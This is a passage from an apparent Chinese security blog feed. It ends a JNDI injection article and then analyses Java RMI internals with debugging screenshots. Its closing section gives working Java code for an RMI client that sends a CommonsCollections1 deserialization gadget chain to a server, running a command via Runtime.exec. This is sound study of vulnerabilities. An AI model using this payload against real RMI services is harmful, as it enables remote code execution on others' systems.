class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次启动客户端和服务端，即可打通。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695728842464-59bc4365-12a1-4c44-bd39-c78344505fb0.png" alt="image.png"><br>注意：</p><ul><li>Server端大部分代码是起一个LDAP服务，关键点笔者给了注释，不用全看懂</li><li>Server端的codebase是随便设都可以的，这个利用方式用不到远程加载</li></ul><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">readObject:424, ObjectInputStream</span><br><span class="line">deserializeObject:531, Obj</span><br><span class="line">decodeObject:239, Obj</span><br><span class="line">c_lookup:1051, LdapCtx</span><br><span class="line">p_lookup:542, ComponentContext</span><br><span class="line">lookup:177, PartialCompositeContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:94, ldapURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:10, JNDILDAPCientBypass8u191</span><br></pre></td></tr></table></figure><p>看调用栈可以看到，一共套娃调用了6层lookup方法，笔者这里直接从LdapCtx#c_lookup开始分析<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695729834756-080f59b2-9525-4c01-bcf6-eba20c5e6e4b.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695730217604-469a17d2-abbe-42e2-aa85-bf332baad58d.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695730310853-6d09e1b1-f9f1-4898-bfb5-ab8d15d5a825.png" alt="image.png"><br>至此，JNDI的LDAP触发反序列化的调试结束。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>JNDI官方教程<br><a href="https://docs.oracle.com/javase/tutorial/jndi/TOC.html">https://docs.oracle.com/javase/tutorial/jndi/TOC.html</a><br>JDK版本修复日志<br><a href="https://www.oracle.com/java/technologies/javase/8u121-relnotes.html">https://www.oracle.com/java/technologies/javase/8u121-relnotes.html</a><br><a href="https://www.oracle.com/java/technologies/javase/8u191-relnotes.html">https://www.oracle.com/java/technologies/javase/8u191-relnotes.html</a><br>JDK补丁代码对比<br><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/a58fca2f8a5d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/a58fca2f8a5d</a><br><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/2db6890a9567">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/2db6890a9567</a><br>JNDI注入漏洞参考<br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a><br><a href="https://www.bilibili.com/video/BV1ct4y1h79t">https://www.bilibili.com/video/BV1ct4y1h79t</a><br><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a><br><a href="https://tttang.com/archive/1611">https://tttang.com/archive/1611</a><br><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a><br><a href="https://tttang.com/archive/1405">https://tttang.com/archive/1405</a><br><a href="https://paper.seebug.org/942/">https://paper.seebug.org/942/</a><br><a href="https://www.cnblogs.com/bitterz/p/15946406.html#">https://www.cnblogs.com/bitterz/p/15946406.html#</a></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>JNDI注入，攻击面很多，本质是类加载和反序列化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;根据官方教程，JNDI（Java Naming and Directory Interface）是为Java程序提供的，一组用来统一调用命名</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="JNDI" scheme="https://jaspersec.top/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>RMI漏洞分析</title>
    <link href="https://jaspersec.top/posts/3242753911.html"/>
    <id>https://jaspersec.top/posts/3242753911.html</id>
    <published>2023-12-24T02:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>时间有限，目前只跟完了RMI的源码分析部分，攻击和绕过只有下周再来了。<br>不过跟源码也已经发现了一些有意思的反序列化点，也算是为后面学习打基础了。</p><p>更新：RMI的攻击分析也差不多结束了，还差JEP290的绕过不太想看，我要去修手机了。</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>看了一些师傅的文章，发现RMI交互这块内容写得都异常混乱，大篇幅的文字，很容易看得云里雾里。<br>这里我按照下图标号的顺序，依次调试每一块代码，并对代码进行标注，希望能对师傅们有所帮助。</p><p>推荐先看完组长的视频，自己跟着调一遍，此时可能会感觉云里雾里、不知所云，这是正常的；<br>接着再看素十八师傅的博客，主要是源码分析这一块，再调试一遍，基本就能掌握了。</p><h2 id="一图胜千言"><a href="#一图胜千言" class="headerlink" title="一图胜千言"></a>一图胜千言</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694537254610-7d9b9003-0690-4413-af92-762888b064e9.png" alt="1.png"></p><h2 id="服务端创建注册中心"><a href="#服务端创建注册中心" class="headerlink" title="服务端创建注册中心"></a>服务端创建注册中心</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501455982-dc009e40-9c77-4969-b2d4-c737cf3d4226.png" alt="image.png"><br>创建RegistryImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501608137-fb1d05ad-0f5c-4788-9456-2cd461075787.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694501774073-c020cd1f-4087-4df8-826a-24e958679c52.png" alt="image.png"><br>setup#UnicastServerRef#exportObject暴露RegistryImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502215812-7c05094e-a70f-481a-89c8-754b9c8f6d34.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502648423-9f095b22-c4ca-42bc-bbdf-df3948f228de.png" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503553792-9a8aedda-1347-4b78-8a1b-a6059a2e06da.png" alt="image.png"><br>最后，把封装了RegiseryImpl_Stub的Target记录进hashtable里，至此注册中心创建完成。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694503721620-8e1dad87-9e26-42da-9d2b-2a4850958d87.png#averageHue=%23104688&clientId=uf0282921-bd1e-4&from=paste&height=234&id=iVLMU&originHeight=292&originWidth=1225&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55669&status=done&style=none&taskId=u079cbc24-39f8-4634-8b9c-1602aa822d2&title=&width=980" alt="image.png"><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503776730-95951cf1-8a9c-43d9-b03a-c54e470356c2.png" alt="image.png"></p><h2 id="服务端创建远程对象"><a href="#服务端创建远程对象" class="headerlink" title="服务端创建远程对象"></a>服务端创建远程对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694504219799-4db0ee3c-f869-403c-9c29-73676c98fbe2.png" alt="image.png"><br>创建RemoteObjectImpl对象</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508220650-d9d0d666-14c8-4738-ad9d-adb5e569a0f0.png" alt="image.png"></p><p>调用父类UnicastRemoteObject构造函数，二层套娃。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508263787-dda626b0-bd59-4dd3-8b86-0d34e76e9643.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508377611-0b70f624-35f8-42a6-9451-b4c843df3edf.png" alt="image.png"><br>UnicastRemoteObject#exportObject暴露RemoteObjectImpl对象，二重套娃。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508571800-09a055b0-10c6-4c7f-9f86-6e21015538b5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508730306-c787faec-ee5a-4dcf-8f69-7645f534f0f5.png" alt="image.png"><br>UnicastServerRef#exportObject暴露RemoteObjectImpl对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694508991975-e1656129-5383-422e-b55d-04f4b1eb9621.png" alt="image.png"><br>LiveRef#exportObject暴露Target对象，三层套娃。<br>LiveRef#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694502785168-a0f00105-bf2a-40b6-a60a-0653b1b28c9a.png" alt="image.png"><br>TCPEndpoint#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694503088435-274f0f49-280c-4395-bc79-9882a3394a0e.png" alt="image.png"><br>TCPTransport#exportObject(Target target)<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509237414-3a9b728d-b30b-41dc-8ce8-43400618473a.png" alt="image.png"><br>最后，把封装了RemoteObjectImpl_Stub的Target记录进hashtable里，至此远程对象创建完成。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509401415-a4186191-0a1f-4373-9800-87e597f5cfce.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509461059-c2a68346-2817-435e-af0a-c5e5a12c6c3b.png" alt="image.png"></p><h2 id="服务端远程对象绑定注册中心"><a href="#服务端远程对象绑定注册中心" class="headerlink" title="服务端远程对象绑定注册中心"></a>服务端远程对象绑定注册中心</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694509897011-29ed231d-9c69-4412-9835-c39c597ef638.png" alt="image.png"><br>调用RegistryImpl_Stub#bind()绑定远程对象与名称，将name和对应obj存入bindings，绑定过程到此结束。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694510186510-88f32b48-b162-4c13-ac5c-7dbe5d4d1a49.png" alt="image.png"></p><h2 id="注册中心接受并处理服务端绑定请求"><a href="#注册中心接受并处理服务端绑定请求" class="headerlink" title="注册中心接受并处理服务端绑定请求"></a>注册中心接受并处理服务端绑定请求</h2><p>注册中心通过TCPTransport#handleMessages处理服务端发过来的绑定相关的请求。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694856852769-5f5ffc9d-d674-45a8-aa63-d456f5058647.png" alt="image.png"><br>由于是注册中心代理对象，套娃调oldDispatch处理分发请求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694856970027-81ca45aa-aaef-455f-8fb4-bc4be0d6c5b4.png" alt="image.png"><br>再套娃调用RegistryImpl_Skel#dispatch方法，这个方法真正处理服务端发过来的绑定请求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694857036043-13f9a5e4-554c-4714-8869-c0b04f5fe83b.png" alt="image.png"><br>反序例化服务端传过来的bind(name, remote)里的name和remote，这里如果传恶意remote对象则存在漏洞<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694857338012-b42469ce-467e-4ddf-a2be-15de8f100a0b.png" alt="image.png"></p><h2 id="客户端获取注册中心代理对象"><a href="#客户端获取注册中心代理对象" class="headerlink" title="客户端获取注册中心代理对象"></a>客户端获取注册中心代理对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694517251764-3531168c-35f7-4ddf-9b26-7b5f3a66f743.png" alt="image.png"><br>套娃一层getRegistry，函数重载<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694517778630-e9830bad-4d9a-4fc5-b253-a346409ed703.png" alt="image.png"><br>根据host&#x2F;ip封装LiveRef和UnicastRef<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518167318-840e537b-98be-4220-8664-2ba22adb1a76.png" alt="image.png"><br>通过Ref和RegistryImpl来创建注册中心的代理对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518366441-fb088583-8cf0-4b25-9c20-7d84eb5bd835.png" alt="image.png"><br>到此为止，注册中心的代理对象就创建完毕了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694518623979-9a0de36a-af1f-4ccd-b054-06c6f7fa9298.png" alt="image.png"></p><h2 id="客户端通过注册中心代理查找远程对象"><a href="#客户端通过注册中心代理查找远程对象" class="headerlink" title="客户端通过注册中心代理查找远程对象"></a>客户端通过注册中心代理查找远程对象</h2><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694520985613-f470c71f-fae3-4960-9567-fdb3a2144e14.png" alt="image.png"><br>调用RegistryImpl_Stub#lookup获取查找的远程对象的代理<br>下面这里直接return var23，返回反序列化后的远程对象的代理<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694521407090-bafeecea-1440-49de-92c3-6c675de05b25.png" alt="image.png"></p><h2 id="注册中心收到查询请求并返回远程对象的代理"><a href="#注册中心收到查询请求并返回远程对象的代理" class="headerlink" title="注册中心收到查询请求并返回远程对象的代理"></a>注册中心收到查询请求并返回远程对象的代理</h2><p>这里开始涉及C&#x2F;S交互，首先DEBUG起一个RMIServer，断点打在TCPTransport#handleMessages，<br>这个函数专门用于处理请求信息，然后运行RMIClient，由于执行了lookup方法，所以能命中断点开始调试。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694529541440-fe168494-470a-4407-a43c-c92e311bdcf1.png" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694530230137-02dce31c-e955-4be8-935d-63cd5d4a4eec.png" alt="image.png"><br>这里套娃调用UnicastServerRef#oldDispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694531032551-7874a1b4-7308-4dcb-b96d-b009c38d0dec.png" alt="image.png"><br>再套娃调用skel#dispatch，最终肯定是通过服务端的代理skel来处理网络请求的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694531559917-0d20046a-a039-4d12-940b-6d55b623ee24.png" alt="image.png"><br>调用RegistryImpl_Skel#dispatch，获取Client传过来的name，另外新建RegistryImpl，在Server端本地调用RegistryImpl.lookup(name)，获取返回的远程对象，序列化写回网络连接中，传给Client。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694532235455-439a129d-b747-4aac-b7a9-09ecfcf15445.png" alt="image.png"></p><h2 id="客户端调用远程对象的方法并获取返回结果"><a href="#客户端调用远程对象的方法并获取返回结果" class="headerlink" title="客户端调用远程对象的方法并获取返回结果"></a>客户端调用远程对象的方法并获取返回结果</h2><p>同样涉及C&#x2F;S交互，不过这里DEBUG的是Client，Server正常运行起就行，Client DEBUG启动。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534301981-07d01ba5-496c-469e-8d01-33e9003fd3f5.png" alt="image.png"><br>Client获取的是远程对象的动态代理stub，它调用任意方法都会走到invoke里<br>三层套娃调用<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534399672-e82b8571-2153-4ff1-933a-325a94b7e92e.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534459744-4e5f7e18-6bab-44e9-9294-a585115a6c5a.png" alt="image.png"><br>最后一层，真正进行C&#x2F;S交互，客户端调用远程对象方法，并且从Server端获取到返回值。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694534853484-cc954540-310d-4958-a8af-e6d564cfc060.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694535064279-29145086-6172-486b-a9f5-f2b6a5b9cf0d.png" alt="image.png"><br>至此，Client调用远程对象的方法结束。</p><h2 id="服务端接收调用函数请求并返回执行结果"><a href="#服务端接收调用函数请求并返回执行结果" class="headerlink" title="服务端接收调用函数请求并返回执行结果"></a>服务端接收调用函数请求并返回执行结果</h2><p>Server还是断在TCPTransport#handleMessages，DEBUG起Server，正常运行起Client。<br>handleMessages会获取很多请求，像是之前注册中心的lookup，这里多跳几下就能到调用方法的请求了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694535921686-97620b4d-e2f2-46b9-9049-c0dd3d8026da.png" alt="image.png"><br>调用serviceCall进一步处理网络请求信息，最后调用到UnicastServerRef#dispatch<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536458461-f50b3cb0-bd8b-437a-a465-67afb64aab04.png" alt="image.png"><br>UnicastServerRef#dispatch，真正处理网络请求，并且返回响应的函数。<br>与调用lookup的不同之处如下<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536639261-a09d33ea-3a58-49fa-861a-e67bd9f3054c.png" alt="image.png"><br>主要逻辑如下<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694536992646-24e13872-1a81-405c-a5e9-3169a2b9ba3e.png" alt="image.png"><br>至此，服务端完成接受客户端调用（传参）、本地执行函数、返回执行结果这个过程。</p><h1 id="RMI的攻击面"><a href="#RMI的攻击面" class="headerlink" title="RMI的攻击面"></a>RMI的攻击面</h1><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>攻击原理：Client调用远程对象的方法的时候，会把参数序列化传到Server端，Server端会反序例化传进来的参数<br>这里需要Interface里有参数为非基本类型的函数。<br><strong>详情见：服务端接收调用函数请求并返回执行结果</strong><br>下面是客户端和服务端的代码，推荐客户端和服务端放在两个不同的工程下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Override</span></span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vulFunc</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">// public void vulFunc(HelloObject o) throws RemoteException;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1.get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// invoke the method of remote object</span></span><br><span class="line">        stub.vulFunc(getCCPayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码，成功执行CC1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694943666872-cff03be1-432c-42b8-a561-96531272d8a9.png" 